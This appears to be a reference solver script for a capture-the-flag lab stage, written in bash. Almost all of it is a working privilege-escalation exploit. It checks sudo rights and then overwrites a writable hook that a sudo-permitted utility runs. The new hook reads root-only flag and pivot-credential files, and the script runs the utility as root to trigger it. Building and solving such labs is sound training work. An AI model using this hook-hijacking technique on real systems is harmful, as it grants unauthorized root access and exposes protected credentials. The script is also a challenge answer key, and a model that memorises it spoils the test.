#!/usr/bin/env bash
# S05 - Broken Trust
# Reference solver for the intended privilege escalation.
# Authorized use only inside the isolated Operation Poisoned Pipeline lab.

set -euo pipefail

HOOK="/opt/nexora/hooks/verify.sh"
UTIL="/usr/local/bin/deploy-verify"

echo "======================================================"
echo " S05 - Broken Trust Solver"
echo "======================================================"
echo

echo "[1] Current identity:"
id

echo
echo "[2] Sudo policy:"
sudo -n -l

echo
echo "[3] Privileged utility metadata:"
ls -ln "${UTIL}"

echo
echo "[4] Trusted hook metadata:"
ls -ln "${HOOK}"

if [[ ! -w "${HOOK}" ]]; then
    echo "[!] Hook is not writable by the current account: ${HOOK}"
    exit 1
fi

echo
echo "[5] Backing up hook to /tmp/s05-solver.bak"
cp "${HOOK}" /tmp/s05-solver.bak

cleanup() {
    cp /tmp/s05-solver.bak "${HOOK}" 2>/dev/null || true
    rm -f /tmp/s05-solver.bak
}
trap cleanup EXIT

echo
echo "[6] Overwriting hook with escalation payload..."
cat > "${HOOK}" <<'EOF'
#!/bin/bash
echo "[verify] running as uid=$(id -u) gid=$(id -g)"
echo "----- S05 -----"
cat /root/s05_flag.txt 2>/dev/null
echo
echo "----- S06 PIVOT HANDOFF -----"
cat /root/s06_pivot.txt 2>/dev/null
EOF
chmod 0755 "${HOOK}"

echo
echo "[7] Running sudo ${UTIL}..."
sudo -n "${UTIL}"

echo
echo "======================================================"
echo " S05 solve complete."
echo " Submit the S05 token to CTFd."
echo " Preserve the S06 pivot credential for S06."
echo "======================================================"
